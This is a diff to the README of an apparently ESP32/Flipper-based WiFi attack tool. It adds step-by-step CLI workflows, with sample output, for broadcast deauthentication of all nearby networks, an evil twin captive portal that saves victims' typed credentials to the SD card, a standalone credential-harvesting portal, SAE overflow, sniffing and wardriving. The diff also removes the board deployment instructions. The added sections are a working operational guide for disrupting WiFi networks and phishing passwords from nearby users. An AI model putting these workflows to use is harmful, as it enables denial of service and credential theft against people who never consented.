@@ -54,17 +54,185 @@ Sniffer is able to passively listen for traffic between AP and Clients. After yo
 
 Additionally you can inspect probe requests captured during the scan.
 
+## Blackout and Sniffer Dog
+
+Blackout scans networks around every 5 minutes and then deauths them all (broadcast).
+
+Sniffer Dog listens to traffic between AP and STA and deauths every station it sniffs.
+
+## Whitelist
+Allows to skip some networks in Sniffer Dog and Blackout attacks. Add networks BSSIDs into white.txt file on your SD card, each in new line:
+
+AA:BB:CC:DD:EE:FF
+
+AA:BB:CC:DD:EE:FF
+
+AA:BB:CC:DD:EE:FF
+
+Please note start_deauth command does not respect whitelist - it attacks all selected networks. 
 
 # CLI Usage
 The board, when connected to USB, offers a CLI interface. 
 The CLI supports up/down arrows and TAB autocompletion. 
-Typical usage would be:
+
+## Deauth
+
+Typical usage for deauth attack would be:
+
 scan_networks
+
 select_networks 1 4
-start_evil_twin
-sae_overflow
+
+start_deauth
 
 Please note that the order of selected networks is important. While all of them will be deauthed, the first one will additionally give its name to an evil twin.
+
+## Evil Twin
+
+Evil Twin workflow in CLI 
+
+First, find all the networks around:
+
+> scan_networks
+
+Starting background WiFi scan...
+
+Background scan started. Wait approx 15s..
+
+> WiFi scan completed. Found 21 networks, status: 0
+
+Retrieved 21 network records
+
+"1","AX3_2.4","30:AA:E4:3C:3F:64","1","WPA2/WPA3 Mixed","-59","2.4GHz"
+
+"2","","30:AA:E4:3C:3F:69","1","WPA2","-60","2.4GHz"
+
+...
+
+Scan results printed.
+
+
+Next, decide which networks would be attacked. You can provide many indexes (space separated).
+
+The first index will be not only deauthed, but will also give its name to the Evil twin network. 
+
+> select_networks 1 2
+
+Selected Networks:
+
+AX3_2.4, 30:aa:e4:3c:3f:64, Ch1, WPA2/WPA3 Mixed
+
+, 30:aa:e4:3c:3f:69, Ch1, WPA2
+
+
+Next, verify what html files are present on SD card:
+
+> list_sd
+
+SD card mounted successfully
+
+[...]
+
+HTML files found on SD card:
+
+1 1EXA~145.HTM
+
+Here we have only one file, now we need to select it by providing its index:
+
+> select_html 1
+
+Loaded HTML file: 1EXA~145.HTM (1668 bytes)
+
+Portal will now use this custom HTML.
+
+Now, we're ready to start the attack:
+
+> start_evil_twin
+
+Starting captive portal for Evil Twin attack on: AX3_2.4
+
+Captive portal started successfully
+
+Attacking 2 network(s):
+
+Target BSSID[0]: AX3_2.4, BSSID: 30:AA:E4:3C:3F:64, Channel: 1
+
+Target BSSID[1]: , BSSID: 30:AA:E4:3C:3F:69, Channel: 1
+
+Deauth attack started. Use 'stop' to stop.
+
+All entered credentials will be stored in EVILTWIN.TXT file on SD card.
+
+## SAE Overflow
+After scan, first run select_networks with only one index:
+
+select_networks 1
+
+Next, run: 
+
+sae_overflow
+
+## Sniffer
+
+First, start sniffing process for as long as you wish:
+
+start_sniffer
+
+next, terminate it with stop:
+
+stop
+
+
+Now, you can see Networks and their associated clients:
+
+show_sniffer_results
+
+Alternatively you can see probe requests:
+
+show_probes
+
+
+## Blackout
+
+Just run: start_blackout
+
+## Sniffer dog
+Just run: start_sniffer_dog
+
+## Wardrive
+
+Just run: start_wardrive
+
+First you need to patiently wait for gps fix to be obtained! Only then wardrive will start and networks would be started.
+
+
+## Portal
+
+verify what html files are present on SD card:
+
+> list_sd
+
+SD card mounted successfully
+
+[...]
+
+HTML files found on SD card:
+
+1 1EXA~145.HTM
+
+Here we have only one file, now we need to select it by providing its index:
+
+> select_html 1
+
+Loaded HTML file: 1EXA~145.HTM (1668 bytes)
+
+Portal will now use this custom HTML.
+
+Now, we're ready to start the attack:
+
+start_portal MySSID
+
+Network named MySSID will be created. All entered credentials will be stored in PORTAL.TXT file on SD card.
 
 
 # Flipper application screens and user journey
@@ -126,50 +294,19 @@ Finally when you run Show Probes you can see report of probe requests:
 
 ![alt text](Gfx/probes.png)
 
+Select portal option presents portals found on the SD card:
+
+![alt text](Gfx/portals.png)
 
 
-# Deployment to boards
-For Evil Twin - it's all about MACs! C5 needs to know ESP32 MAC and vice versa. At the moment you need to modify it straight in the code.
+Blackout attack
 
-All other attacks require just one board and you don't need to worry about it.
+![alt text](Gfx/blackout.png)
 
-## Initial deployment to ESP32
-Use Arduino IDE and open the EvilTwin_slave.ino file.
+Sniffer dog attack
 
-Side note: When uploading code to ESP32C3 (or S3) remember to set USB CDC On Boot to Enabled - otherwise you will not see any serial:
+![alt text](Gfx/sniffer.png)
 
-![alt text](Gfx/image-2.png)
-
-Next, after starting up it will print its MAC in the Serial Monitor:
-
-![alt text](Gfx/image-3.png)
-Note it down. 
-
-## Initial deployment to ESP32-C5
-Use ESP-IDF. Open the Folder ESP32C5 and then click Open:
-
-![alt text](Gfx/image-4.png) 
-
-
-Next, build, flash and monitor:
-
-![alt text](Gfx/image-5.png)
-
-After it starts, grab the MAC address of the C5 from the logs:
-
-![alt text](Gfx/image-6.png)
-
-## MAC code updates
-Now, in Arduino enter the C5 MAC address (in hex form of byte array):
-
-![alt text](Gfx/image-7.png)
-
-Next, in ESP-IDF in main.c on top enter the ESP32 MAC address:
-
-![alt text](Gfx/image-8.png)
-
-# Now recompile and flash both boards again.
-They should become aware of each other and be able to communicate over ESP-NOW.
 
 ## Flashing ESP32-C5 Board
 
